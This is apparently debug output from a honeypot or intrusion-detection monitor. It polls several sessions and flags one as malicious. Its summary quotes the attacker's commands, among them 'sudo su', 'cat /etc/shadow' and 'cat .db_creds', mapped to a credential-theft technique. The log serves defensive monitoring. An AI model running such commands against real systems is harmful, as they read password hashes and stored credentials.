+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 17, Previous: 17
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 17
+[DEBUG] New events detected for session 16c2f697f636. Processing...
+[*] Logged MALICIOUS event for session 16c2f697f636 to malicious_alerts.log
+
+==================================================
+ADAPTIVE INTELLIGENCE FOR SESSION: 16c2f697f636
+Detected Level : 3 (MALICIOUS)
+Intent         : System Discovery
+Skill Level    : Intermediate
+Attack Stage   : Reconnaissance
+RAG Mapping    : Unsecured Credentials (T1552)
+Summary        : The user executed a command sequence ('ls', 'sudo su', 'whoami', 'pwd', 'cat etc/shadow', 'cat /etc/shadow', 'ls', '', 'cat .db_creds') that matches Unsecured Credentials (T1552) behavior, triggering detections: Privilege Escalation Attempt, System Discovery (Reconnaissance).
+Status         : Policy Updated for Live Session
+==================================================
+
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 10, Previous: 10
+[DEBUG] Checking session 16c2f697f636. Current events: 18, Previous: 18
